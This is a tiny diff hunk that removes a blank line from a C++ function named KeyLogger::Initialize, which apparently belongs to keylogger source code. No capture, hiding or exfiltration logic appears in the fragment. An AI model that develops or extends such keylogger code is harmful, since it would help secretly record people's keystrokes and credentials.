@@ -1232,7 +1232,6 @@ PKeyLogger KeyLogger::Initialize(PCHAR AppName)
 		ClearStruct(KLG);
 	}
 
-
 	if (GlobalKeyLogger != NULL)
 		return GlobalKeyLogger;
 
